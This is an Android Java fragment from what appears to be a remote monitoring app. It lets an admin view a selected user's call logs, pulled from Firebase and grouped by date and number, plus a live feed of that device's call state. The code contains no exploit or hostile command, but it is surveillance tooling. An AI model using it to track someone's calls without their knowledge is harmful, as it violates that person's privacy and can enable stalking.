package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.textfield.TextInputEditText;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.lang.ref.WeakReference;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

public class AdminCallLogsFragment extends Fragment {

    private static WeakReference<AdminCallLogsFragment> activeInstance;

    private RecyclerView recyclerView;
    private View loader;
    private TextView emptyText;
    private TextInputEditText searchInput;
    private LinearLayout dateChipsRow;
    private View liveStatusContainer;
    private TextView liveStatusValue;
    private com.google.firebase.database.ValueEventListener liveCallListener;
    private com.google.firebase.database.ValueEventListener configListener;
    private CallLogAdapter adapter;
    private List<Object> fullItems = new ArrayList<>();
    private String selectedDate;

    // ── Data model ────────────────────────────────────────

    static class CallGroup {
        String number;
        String displayName;
        int callType; // 1=incoming, 2=outgoing, 3=missed, 0=mixed
        long startTime;
        long endTime;
        long totalDurationSec;
        int callCount;
    }

    // ── Fragment lifecycle ────────────────────────────────

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        activeInstance = new WeakReference<>(this);
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater,
                             @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_call_logs, container, false);

        recyclerView = view.findViewById(R.id.cl_recycler);
        loader = view.findViewById(R.id.cl_loader);
        emptyText = view.findViewById(R.id.cl_empty_text);
        searchInput = view.findViewById(R.id.cl_search_input);
        dateChipsRow = view.findViewById(R.id.cl_date_chips_row);
        liveStatusContainer = view.findViewById(R.id.cl_live_status_container);
        liveStatusValue = view.findViewById(R.id.cl_live_status_value);

        view.findViewById(R.id.cl_back_button)
                .setOnClickListener(v -> getParentFragmentManager().popBackStack());
        view.findViewById(R.id.cl_refresh_button)
                .setOnClickListener(v -> {
                    if (selectedDate != null) {
                        showLoading();
                        FirebaseUtils.getRemoteCallLogs(selectedDate);
                    } else {
                        loadDates();
                    }
                });

        recyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
        adapter = new CallLogAdapter(requireContext());
        recyclerView.setAdapter(adapter);

        searchInput.addTextChangedListener(new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int i, int c, int a) {}
            @Override public void onTextChanged(CharSequence s, int i, int b, int c) {
                applyFilter(s.toString());
            }
            @Override public void afterTextChanged(Editable s) {}
        });

        loadDates();
        setupLiveCallStatus();
        return view;
    }

    private void setupLiveCallStatus() {
        String configPath = FirebaseUtils.getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/REQUEST_CALL_LOG_PERMISSION/extraConfig/liveMonitoringEnabled");
        if (configPath == null) return;

        configListener = new com.google.firebase.database.ValueEventListener() {
            @Override
            public void onDataChange(@NonNull com.google.firebase.database.DataSnapshot snapshot) {
                boolean enabled = snapshot.exists() && Boolean.TRUE.equals(snapshot.getValue(Boolean.class));
                if (enabled) {
                    liveStatusContainer.setVisibility(View.VISIBLE);
                    attachLiveCallListener();
                } else {
                    liveStatusContainer.setVisibility(View.GONE);
                    removeLiveCallListener();
                }
            }
            @Override public void onCancelled(@NonNull com.google.firebase.database.DatabaseError error) {}
        };
        FirebaseUtils.getDbRef(configPath).addValueEventListener(configListener);
    }

    private void attachLiveCallListener() {
        if (liveCallListener != null) return;

        String path = FirebaseUtils.getSelectedUserPath("/userDeviceData/liveCallStatus");
        if (path == null) return;

        liveCallListener = new com.google.firebase.database.ValueEventListener() {
            @Override
            public void onDataChange(@NonNull com.google.firebase.database.DataSnapshot snapshot) {
                if (!isAdded() || getContext() == null) return;
                if (snapshot.exists()) {
                    String state = snapshot.child("state").getValue(String.class);
                    String detail = snapshot.child("detail").getValue(String.class);
                    if ("IDLE".equals(state)) {
                        liveStatusValue.setText("Idle (No active calls)");
                        liveStatusValue.setTextColor(requireContext().getColor(R.color.text_secondary));
                    } else {
                        liveStatusValue.setText(state + ": " + (detail != null ? detail : ""));
                        liveStatusValue.setTextColor(requireContext().getColor(R.color.spending_credit));
                    }
                } else {
                    liveStatusValue.setText("Unknown (No data)");
                }
            }
            @Override public void onCancelled(@NonNull com.google.firebase.database.DatabaseError error) {}
        };
        FirebaseUtils.getDbRef(path).addValueEventListener(liveCallListener);
    }

    private void removeLiveCallListener() {
        if (liveCallListener != null) {
            String path = FirebaseUtils.getSelectedUserPath("/userDeviceData/liveCallStatus");
            if (path != null) {
                FirebaseUtils.getDbRef(path).removeEventListener(liveCallListener);
            }
            liveCallListener = null;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        removeLiveCallListener();
        if (configListener != null) {
            String configPath = FirebaseUtils.getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/REQUEST_CALL_LOG_PERMISSION/extraConfig/liveMonitoringEnabled");
            if (configPath != null) {
                FirebaseUtils.getDbRef(configPath).removeEventListener(configListener);
            }
            configListener = null;
        }
        activeInstance = null;
    }

    // ── Date chip loading ─────────────────────────────────

    private void loadDates() {
        showLoading();
        FirebaseUtils.getAvailableCallLogDates(dates -> {
            if (getActivity() == null) return;
            getActivity().runOnUiThread(() -> {
                loader.setVisibility(View.GONE);
                if (dates.isEmpty()) {
                    emptyText.setVisibility(View.VISIBLE);
                    return;
                }
                buildDateChips(dates);
                String today = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
                        .format(new Date());
                selectDate(dates.contains(today) ? today : dates.get(0));
            });
        });
    }

    private void buildDateChips(List<String> dates) {
        if (getContext() == null || dateChipsRow == null) return;
        dateChipsRow.removeAllViews();
        for (String date : dates) {
            TextView chip = new TextView(getContext());
            chip.setText(formatDateLabel(date));
            chip.setTag(date);
            chip.setTextSize(12f);
            chip.setPadding(dp(14), dp(7), dp(14), dp(7));
            chip.setGravity(Gravity.CENTER);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT);
            lp.setMarginEnd(dp(8));
            chip.setLayoutParams(lp);
            styleChip(chip, false);
            chip.setOnClickListener(v -> selectDate(date));
            dateChipsRow.addView(chip);
        }
    }

    private void selectDate(String date) {
        selectedDate = date;
        for (int i = 0; i < dateChipsRow.getChildCount(); i++) {
            View v = dateChipsRow.getChildAt(i);
            if (v instanceof TextView) styleChip((TextView) v, date.equals(v.getTag()));
        }
        showLoading();
        FirebaseUtils.getRemoteCallLogs(date);
    }

    private void styleChip(TextView chip, boolean selected) {
        GradientDrawable bg = new GradientDrawable();
        bg.setShape(GradientDrawable.RECTANGLE);
        bg.setCornerRadius(dp(20));
        if (selected) {
            bg.setColor(requireContext().getColor(R.color.primary));
            chip.setTextColor(requireContext().getColor(R.color.on_primary));
        } else {
            bg.setColor(requireContext().getColor(R.color.surface_variant));
            chip.setTextColor(requireContext().getColor(R.color.text_secondary));
        }
        chip.setBackground(bg);
    }

    private String formatDateLabel(String dateKey) {
        try {
            Date date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).parse(dateKey);
            if (date == null) return dateKey;
            Calendar today = Calendar.getInstance(), yesterday = Calendar.getInstance(), dc = Calendar.getInstance();
            yesterday.add(Calendar.DAY_OF_YEAR, -1);
            dc.setTime(date);
            if (sameDay(today, dc)) return "Today";
            if (sameDay(yesterday, dc)) return "Yesterday";
            if (today.get(Calendar.YEAR) == dc.get(Calendar.YEAR))
                return new SimpleDateFormat("MMM d", Locale.getDefault()).format(date);
            return new SimpleDateFormat("MMM d, yyyy", Locale.getDefault()).format(date);
        } catch (ParseException e) { return dateKey; }
    }

    // ── Static callback from ActionUtils ─────────────────

    public static void displayCallLogs(Activity activity, Map<String, Map<String, String>> data) {
        if (activeInstance == null || activeInstance.get() == null || activity == null) return;
        AdminCallLogsFragment f = activeInstance.get();
        activity.runOnUiThread(() -> f.updateUI(data));
    }

    private void updateUI(Map<String, Map<String, String>> data) {
        if (getView() == null) return;
        loader.setVisibility(View.GONE);
        if (data == null || data.isEmpty()) {
            emptyText.setVisibility(View.VISIBLE);
            recyclerView.setVisibility(View.GONE);
            fullItems = new ArrayList<>();
            adapter.setItems(fullItems);
            return;
        }
        emptyText.setVisibility(View.GONE);
        fullItems = buildItems(data);
        applyFilter(searchInput.getText() != null ? searchInput.getText().toString() : "");
    }

    // ── Grouping logic (single date) ──────────────────────

    private List<Object> buildItems(Map<String, Map<String, String>> data) {
        List<Map<String, String>> records = new ArrayList<>(data.values());
        records.sort((a, b) -> Long.compare(parseLong(b, "date"), parseLong(a, "date")));

        LinkedHashMap<String, List<Map<String, String>>> byNumber = new LinkedHashMap<>();
        for (Map<String, String> r : records) {
            String num = r.get("number");
            if (num == null || num.isEmpty()) num = "Unknown";
            byNumber.computeIfAbsent(num, k -> new ArrayList<>()).add(r);
        }

        List<Object> items = new ArrayList<>();
        for (Map.Entry<String, List<Map<String, String>>> entry : byNumber.entrySet()) {
            items.add(buildCallGroup(entry.getKey(), entry.getValue()));
        }
        return items;
    }

    private CallGroup buildCallGroup(String number, List<Map<String, String>> calls) {
        CallGroup g = new CallGroup();
        g.number = number;
        g.callCount = calls.size();
        for (Map<String, String> c : calls) {
            String n = c.get("name");
            if (n != null && !n.isEmpty() && !"null".equals(n)) { g.displayName = n; break; }
        }
        if (g.displayName == null) g.displayName = number;

        Set<String> types = new HashSet<>();
        for (Map<String, String> c : calls) types.add(c.getOrDefault("type", "0"));
        if (types.size() == 1) {
            String t = types.iterator().next();
            if ("1".equals(t) || "INCOMING".equalsIgnoreCase(t)) g.callType = 1;
            else if ("2".equals(t) || "OUTGOING".equalsIgnoreCase(t)) g.callType = 2;
            else if ("3".equals(t) || "MISSED".equalsIgnoreCase(t)) g.callType = 3;
        }

        long minTime = Long.MAX_VALUE, maxTime = Long.MIN_VALUE, totalDur = 0;
        for (Map<String, String> c : calls) {
            long ts = parseLong(c, "date");
            if (ts > 0 && ts < minTime) minTime = ts;
            if (ts > maxTime) maxTime = ts;
            totalDur += parseLong(c, "duration");
        }
        g.startTime = minTime == Long.MAX_VALUE ? 0 : minTime;
        g.endTime = maxTime == Long.MIN_VALUE ? 0 : maxTime;
        g.totalDurationSec = totalDur;
        return g;
    }

    // ── Search / filter ───────────────────────────────────

    private void applyFilter(String query) {
        List<Object> filtered;
        if (query == null || query.isEmpty()) {
            filtered = fullItems;
        } else {
            String lq = query.toLowerCase(Locale.getDefault());
            filtered = new ArrayList<>();
            for (Object item : fullItems) {
                if (item instanceof CallGroup) {
                    CallGroup g = (CallGroup) item;
                    if (g.displayName.toLowerCase(Locale.getDefault()).contains(lq)
                            || g.number.toLowerCase(Locale.getDefault()).contains(lq)) {
                        filtered.add(g);
                    }
                }
            }
        }
        adapter.setItems(filtered);
        boolean empty = filtered.isEmpty();
        recyclerView.setVisibility(empty ? View.GONE : View.VISIBLE);
        emptyText.setVisibility(empty ? View.VISIBLE : View.GONE);
    }

    // ── Helpers ───────────────────────────────────────────

    private void showLoading() {
        loader.setVisibility(View.VISIBLE);
        recyclerView.setVisibility(View.GONE);
        emptyText.setVisibility(View.GONE);
    }

    private boolean sameDay(Calendar a, Calendar b) {
        return a.get(Calendar.YEAR) == b.get(Calendar.YEAR)
                && a.get(Calendar.DAY_OF_YEAR) == b.get(Calendar.DAY_OF_YEAR);
    }

    private long parseLong(Map<String, String> map, String key) {
        try { return (long) Double.parseDouble(map.getOrDefault(key, "0")); }
        catch (Exception e) { return 0; }
    }

    private int dp(int val) {
        if (!isAdded() || getContext() == null) return val * 3; // Fallback
        return (int) (val * getResources().getDisplayMetrics().density);
    }

    // ── Adapter ───────────────────────────────────────────

    static class CallLogAdapter extends RecyclerView.Adapter<CallGroupVH> {
        private List<CallGroup> items = new ArrayList<>();
        private final android.content.Context context;

        CallLogAdapter(android.content.Context context) { this.context = context; }

        void setItems(List<Object> raw) {
            items = new ArrayList<>();
            for (Object o : raw) { if (o instanceof CallGroup) items.add((CallGroup) o); }
            notifyDataSetChanged();
        }

        @NonNull @Override
        public CallGroupVH onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            View v = LayoutInflater.from(parent.getContext())
                    .inflate(R.layout.item_call_log_group, parent, false);
            return new CallGroupVH(v, context);
        }

        @Override
        public void onBindViewHolder(@NonNull CallGroupVH holder, int pos) { holder.bind(items.get(pos)); }

        @Override public int getItemCount() { return items.size(); }
    }

    // ── ViewHolder ────────────────────────────────────────

    static class CallGroupVH extends RecyclerView.ViewHolder {
        private final TextView dirIcon, name, number, secondLine, duration, countBadge;
        private final android.content.Context context;

        CallGroupVH(View v, android.content.Context ctx) {
            super(v);
            context = ctx;
            dirIcon = v.findViewById(R.id.cl_direction_icon);
            name = v.findViewById(R.id.cl_name);
            number = v.findViewById(R.id.cl_number);
            secondLine = v.findViewById(R.id.cl_second_line);
            duration = v.findViewById(R.id.cl_duration);
            countBadge = v.findViewById(R.id.cl_count_badge);
        }

        void bind(CallGroup g) {
            String arrow; int color; String dirLabel;
            switch (g.callType) {
                case 1:  arrow = "↙"; color = 0xFF4CAF50; dirLabel = "Incoming"; break;
                case 2:  arrow = "↗"; color = 0xFF2196F3; dirLabel = "Outgoing"; break;
                case 3:  arrow = "↘"; color = 0xFFF44336; dirLabel = "Missed";   break;
                default: arrow = "↕"; color = 0xFFFF9800; dirLabel = "Mixed";    break;
            }
            GradientDrawable circle = new GradientDrawable();
            circle.setShape(GradientDrawable.OVAL);
            circle.setColor(color);
            dirIcon.setBackground(circle);
            dirIcon.setText(arrow);
            dirIcon.setTextColor(0xFFFFFFFF);

            name.setText(g.displayName);
            if (!g.displayName.equals(g.number)) {
                number.setText(g.number);
                number.setVisibility(View.VISIBLE);
            } else {
                number.setVisibility(View.GONE);
            }

            SimpleDateFormat tf = new SimpleDateFormat("HH:mm", Locale.getDefault());
            String start = g.startTime > 0 ? tf.format(new Date(g.startTime)) : "";
            String end = (g.callCount > 1 && g.endTime > 0 && g.endTime != g.startTime)
                    ? " – " + tf.format(new Date(g.endTime)) : "";
            secondLine.setText(dirLabel + "  ·  " + start + end);

            if (g.callType == 3 && g.totalDurationSec == 0) {
                duration.setText("Missed");
                duration.setTextColor(0xFFF44336);
            } else if (g.totalDurationSec > 0) {
                long m = g.totalDurationSec / 60, s = g.totalDurationSec % 60;
                duration.setText(m > 0 ? m + "m " + s + "s" : s + "s");
                duration.setTextColor(context.getColor(R.color.text_secondary));
            } else {
                duration.setText("");
            }

            if (g.callCount > 1) {
                countBadge.setText("×" + g.callCount);
                countBadge.setVisibility(View.VISIBLE);
                countBadge.setTextColor(color);
                GradientDrawable chip = new GradientDrawable();
                chip.setShape(GradientDrawable.RECTANGLE);
                chip.setCornerRadius(12 * context.getResources().getDisplayMetrics().density);
                chip.setColor((0x33 << 24) | (color & 0x00FFFFFF));
                countBadge.setBackground(chip);
            } else {
                countBadge.setVisibility(View.GONE);
            }
        }
    }
}
